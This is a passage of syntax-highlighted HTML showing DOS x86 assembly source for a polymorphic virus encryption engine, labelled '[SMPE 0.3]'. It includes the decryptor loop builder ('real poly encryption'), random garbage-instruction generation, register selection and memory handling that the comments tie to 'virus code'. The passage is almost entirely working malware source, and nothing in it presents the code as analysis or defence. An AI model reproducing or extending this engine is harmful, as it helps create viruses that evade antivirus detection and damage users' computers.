        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">come_here</span><span class="sc0">
</span><span class="sc5">no_regused</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">enc_loop</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; put working opcode</span><span class="sc0">
</span><span class="sc5">come_here</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">46h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">inverse</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ok_no_cl_ch</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
</span><span class="sc5">ok_no_cl_ch</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">second_inc</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">   </span><span class="sc1">; put another inc</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">isword</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">pre_enc_loop_one</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">second_inc</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">   </span><span class="sc1">; put another incs for dwords</span><span class="sc0">

</span><span class="sc5">pre_enc_loop_one</span><span class="sc4">:</span><span class="sc0">



</span><span class="sc5">no_nopput</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">066h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b8h</span><span class="sc0">                    </span><span class="sc1">; mov eax,</span><span class="sc0">
</span><span class="sc5">random_ax</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; immediate</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b1h</span><span class="sc0">                    </span><span class="sc1">; mov cl,</span><span class="sc0">
</span><span class="sc5">cl_move</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">                     </span><span class="sc1">; immediate</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">; DS to what we must encrypt</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">full_enc_loop</span><span class="sc0">           </span><span class="sc1">; cpus rules 4 prefetch</span><span class="sc0">


</span><span class="sc5">add_to_cx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0111111b</span><span class="sc0">                     </span><span class="sc1">; add up to 63 bytes to</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">; the lenght in CX</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">poly_name</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'[SMPE 0.3]'</span><span class="sc0">

</span><span class="sc5">set_386_prefix</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">066h</span><span class="sc0">                         </span><span class="sc1">; set 066h prefix</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">full_enc_loop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">prefix_386</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">             </span><span class="sc1">; may be 66h if 386 codes used</span><span class="sc0">

</span><span class="sc5">enc_loop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;               xor     byte ptr ds:[si],immediate</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">080h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">034h</span><span class="sc0">            </span><span class="sc1">; real poly encryption</span><span class="sc0">
</span><span class="sc5">random_value</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">090h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">             </span><span class="sc1">; random value2</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">             </span><span class="sc1">; dword op random values</span><span class="sc0">

</span><span class="sc5">first_inc</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">46h</span><span class="sc0">             </span><span class="sc1">; inc si</span><span class="sc0">
</span><span class="sc5">second_inc</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">             </span><span class="sc1">; space for second inc si</span><span class="sc0">
</span><span class="sc5">incs_386</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">         </span><span class="sc1">; space for other two incs</span><span class="sc0">

</span><span class="sc5">modify_key</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0"> </span><span class="sc1">; space for key modification op</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">full_enc_loop</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">inverse</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">       </span><span class="sc1">; from end?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">normali</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">; adjust lenght</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">after_it</span><span class="sc0">
</span><span class="sc5">normali</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">after_it</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                           </span><span class="sc1">; ds:dx = generated code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                           </span><span class="sc1">; cx=lenght</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">add_to_cx</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                              </span><span class="sc1">; starting off</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">simulate21</span><span class="sc0">                      </span><span class="sc1">; deallocate the mem for poly</span><span class="sc0">
                                                </span><span class="sc1">; ES still on virus code,</span><span class="sc0">
                                                </span><span class="sc1">; but now it isn't allocated</span><span class="sc0">
                                                </span><span class="sc1">; any more</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">do_garbage</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0bbh</span><span class="sc0">            </span><span class="sc1">; max number of garbage instructions allowed</span><span class="sc0">
</span><span class="sc5">gnum</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0fh</span><span class="sc0">             </span><span class="sc1">; mov bx,000fh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">pung</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">       </span><span class="sc1">; how much instructions</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">pung</span><span class="sc0">            </span><span class="sc1">; no 0 instruction allowed!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">           </span><span class="sc1">; CX = number of instructions to generate</span><span class="sc0">

</span><span class="sc5">do_the_random</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc0">                           </span><span class="sc1">; used for the random gen</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                          </span><span class="sc1">; no SP allowed</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">do_the_random</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">count_reg</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; don't change the counter</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">do_the_random</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">point_reg</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; don't change the pointer</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">do_the_random</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">nocx</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; no CX change if used</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">do_the_random</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">reg8bits</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; reset 8 bit marker</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">select_instruction</span><span class="sc0">              </span><span class="sc1">; generate the instuction</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">do_the_random</span><span class="sc0">                   </span><span class="sc1">; with the selected reg.</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">select_instruction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                              </span><span class="sc1">; AH = destination register</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">instructions</span><span class="sc0">
</span><span class="sc5">redorndin</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">               </span><span class="sc1">; 0Ah basic types of instructions</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">               </span><span class="sc1">; don't eliminate some</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">            </span><span class="sc1">; which instruction will we generate</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">last_done</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; try to change sometime</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">redorndin</span><span class="sc0">
</span><span class="sc5">continue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">last_done</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; store type</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; point to the instr. in the table</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; which instruction</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">foo_label</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">one_byte_instruction</span><span class="sc0">

</span><span class="sc5">foo_label</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">no_3b</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">three_bytes_instruction</span><span class="sc0">
</span><span class="sc5">no_3b</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; which instruction</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">outta_here</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">foo_label_2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">not_nop</span><span class="sc0">
</span><span class="sc5">foo_label_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">outta_here</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">rolling</span><span class="sc0">
</span><span class="sc5">outta_here</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">finish_mate</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">calltheran</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                            </span><span class="sc1">; is a compare?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">end_cmp_check</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cmp_check</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; sign it.</span><span class="sc0">
</span><span class="sc5">end_cmp_check</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">instr_change</span><span class="sc0">

</span><span class="sc5">finish_mate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">; instruction base oc</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">                 </span><span class="sc1">; op code for reg+instr</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">only16</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">         </span><span class="sc1">; reg16 or reg8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">only16</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; bytes opcode = word opcode-1</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">only16</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                  </span><span class="sc1">; high 8 bits</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">end_8_bts</span><span class="sc0">
</span><span class="sc5">only16</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">08bh</span><span class="sc0"> </span><span class="sc1">; only if moving</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">finishing_mate</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ds_mody</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">end_8_bts</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">end_8_bts</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; ds has eq second opcode as bx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">end_8_bts</span><span class="sc0">

</span><span class="sc5">finishing_mate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">end_8_bts</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">reg8bits</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">gen_mpos</span><span class="sc0">
</span><span class="sc5">end_8_bts</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">instr_change</span><span class="sc0">
</span><span class="sc5">stor_chkjmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cmp_check</span><span class="sc4">],</span><span class="sc2">0001</span><span class="sc0">    </span><span class="sc1">; encountered a cmp?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_comparing</span><span class="sc0">                   </span><span class="sc1">; but out of a jmp region?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">jumping_zone</span><span class="sc0">                    </span><span class="sc1">; no, so do one</span><span class="sc0">
</span><span class="sc5">not_comparing</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">one_byte_instruction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; dec/inc generation</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">                          </span><span class="sc1">; INT 21h generation?</span><span class="sc0">
